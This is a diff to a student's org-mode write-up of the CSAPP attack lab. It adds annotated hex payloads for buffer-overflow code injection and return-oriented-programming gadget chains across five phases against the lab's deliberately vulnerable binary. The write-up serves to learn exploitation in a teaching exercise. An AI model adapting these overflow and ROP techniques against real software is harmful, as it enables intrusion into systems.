@@ -7,12 +7,12 @@ random garbage and a 8-byte wide ~0x4017c0~.
 The string that used by =hex2raw= to generate the actual input string:
 
 #+begin_example
-c0 17 40 00 00 00 00 00
-c0 17 40 00 00 00 00 00
-c0 17 40 00 00 00 00 00
-c0 17 40 00 00 00 00 00
-c0 17 40 00 00 00 00 00
-c0 17 40 00 00 00 00 00
+c0 17 40 00 00 00 00 00 /* padding */
+c0 17 40 00 00 00 00 00 /* padding */
+c0 17 40 00 00 00 00 00 /* padding */
+c0 17 40 00 00 00 00 00 /* padding */
+c0 17 40 00 00 00 00 00 /* padding */
+c0 17 40 00 00 00 00 00 /* return address */
 #+end_example
 
 * Phase 2
@@ -54,14 +54,14 @@ new injected code is:
 The corresponding string that we feed to =hex2raw= is:
 
 #+begin_example
-48 c7 c7 fa 97 b9 59
-68 ec 17 40 00
-c3
-00 00 00
-78 dc 61 55 00 00 00 00
-78 dc 61 55 00 00 00 00
-78 dc 61 55 00 00 00 00
-78 dc 61 55 00 00 00 00
+48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa, %rdi */
+68 ec 17 40 00       /* push $0x4017ec */
+c3                   /* ret */
+00 00 00             /* padding */
+78 dc 61 55 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* return address */
 #+end_example
 
 * Phase 3
@@ -88,26 +88,29 @@ The code we need is:
 This does not work. It happens to be written by some stack validation
 mechanism. Try offset it a little bit.
 
-Offsetting it makes it more closer to the top of the stack, which
-makes it easier to be overwrote. Actually, it gets overwrote by a ~push~
+Offsetting it towards the top of the stack (lower addresses) makes it
+easier to be overwrote. Actually, it gets overwrote by a ~push~
 instruction.
 
 Analyzing the assembly code of ~touch3~, ~hexmatch~ tells that the stack
 allocated by ~getbuf~ can not be used, they are all overwritten. Thus,
-we can only place the string further down the stack. This leads to a
-segmentation fault in phase 2. Let's see if it will work in phase 3.
+we can only place the string further towards the bottom of the stack
+(higher addresses). This leads to a segmentation fault in
+phase 2. Let's see if it will work in phase 3.
+
+The final code is:
 
 #+begin_example
-35 39 62 39 39 37 66 61
-00 00 00 00 00 00 00 00
-48 c7 c7 a8 dc 61 55
-68 fa 18 40 00
-c3
-00 00 00
-88 dc 61 55 00 00 00 00
-88 dc 61 55 00 00 00 00
-35 39 62 39 39 37 66 61
-00 00 00 00 00 00 00 00
+35 39 62 39 39 37 66 61 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+48 c7 c7 a8 dc 61 55    /* mov $0x5561dca8, %rdi */
+68 fa 18 40 00          /* push $0x4018fa */
+c3                      /* ret */
+00 00 00                /* padding */
+88 dc 61 55 00 00 00 00 /* padding */
+88 dc 61 55 00 00 00 00 /* return address */
+35 39 62 39 39 37 66 61 /* cookie string */
+00 00 00 00 00 00 00 00 /* ending zero */
 #+end_example
 
 The code works. I guess phase 3 uses a different validation protocol
@@ -115,3 +118,119 @@ than phase 2. Note that I have adjusted the address of the string in
 the injected code to be =0x5561dca8=.
 
 * Phase 4
+
+The byte sequence =58 90 c3=, starting at address =0x4019ab= in
+~addval_219~, can be used as the following instructions:
+
+#+begin_src asm
+          pop %rax
+          nop
+          ret
+#+end_src
+
+The byte sequence =48 89 c7 c3=, starting at address =0x4019a2= in
+~addval_273~, can be used as the following instructions:
+
+#+begin_src asm
+          mov %rax, %rdi
+          ret
+#+end_src
+
+The input string starts with 40 bytes of garbage to fill the stack
+space allocated for the stack of ~getbuf~. It is followed by the address
+of our first gadget: =0x4019ab=, which is followed by the value of our
+cookie: =0x59b997fa=, which is followed by the address of the second
+gadget: =0x4019a2=, which finally is followed by the address of ~touch2~:
+=0x4017ec=.
+
+#+begin_example
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+ab 19 40 00 00 00 00 00 /* pop %rax */
+fa 97 b9 59 00 00 00 00 /* cookie number */
+a2 19 40 00 00 00 00 00 /* mov %rax, %rdi */
+ec 17 40 00 00 00 00 00 /* touch2 */
+#+end_example
+
+* Phase 5
+
+The problem in this phase is that the address of the string
+representation of the cookie can not be determined before the program
+runs, because of the stack randomization.
+
+However, notice that if the string is in the injected code and is well
+aligned, then it will be pointed by ~%rsp~ at a certain point of
+time. What we have to do is to take the value of ~%rsp~ and use it as
+the address of the string.
+
+We can do this by copying the value of ~%rsp~ to some register then use
+a ~pop~ instruction to move the stack pointer since the string it points
+to is not a valid return address.
+
+However, the given code in the gadget farm can not achieve this. I was
+stuck by this problem for a while. Then I searched the Internet and
+noticed that [[https://stackoverflow.com/questions/55887127/csapp-3e-attack-lab-phase-5][this post]] was using an ~lea~ instruction. I found out that
+the instruction is part of the gadget farm. I missed it because I did
+not examine the gadget farm thoroughly, and I somehow believed that
+the gadget only contains 4 kinds of instructions: ~mov~, ~pop~, ~ret~, and
+~nop~. This is in the writeup of the lab:
+
+#+begin_quote
+You can construct your solution using gadgets consisting of the
+following instruction types, and using only the first x86-64 registers
+(~%rax~-~%rdi~).
+
+~movq~ : ...
+
+~popq~ : ...
+
+~ret~ : ...
+
+~nop~ : ...
+#+end_quote
+
+I have to say this part misled me.
+
+Anyway, with the ~lea~ instruction at hand, I could compute the address
+of the string rather than getting it directly.
+
+However, there is another problem. To compute the address of the
+string, I have to add an offset to a stack pointer. These two numbers
+have to be placed in ~%rdi~ and ~%rsi~. It turns out the gadgets I have at
+hand can only allow me to transport these values from ~%rax~ through one
+of the following path:
+
+1. ~%rax~, ~%rdi~
+2. ~%rax~, ~%edx~, ~%ecx~, ~%esi~
+
+
+In my first attempt I did not think about it carefully and transported
+the stack pointer, i.e. a 64-bit long address, through the second
+path, and lost the higher 32 bits along the way. However, if I use the
+second path to transport the offset, there is no loss of information
+since the offset is a small number.
+
+The final solution is:
+
+#+begin_example
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* mov %rsp, %rax */
+a2 19 40 00 00 00 00 00 /* mov %rax, %rdi */
+ab 19 40 00 00 00 00 00 /* pop %rax */
+48 00 00 00 00 00 00 00 /* offset */
+42 1a 40 00 00 00 00 00 /* mov %eax, %edx */
+69 1a 40 00 00 00 00 00 /* mov %edx, %ecx */
+13 1a 40 00 00 00 00 00 /* mov %ecx, %esi */
+d6 19 40 00 00 00 00 00 /* lea(rdi,%rsi,1), %rax */
+a2 19 40 00 00 00 00 00 /* mov %rax, %rdi */
+fa 18 40 00 00 00 00 00 /* touch3 */
+35 39 62 39 39 37 66 61 /* cookie string */
+00 00 00 00 00 00 00 00 /* ending zero */
+#+end_example
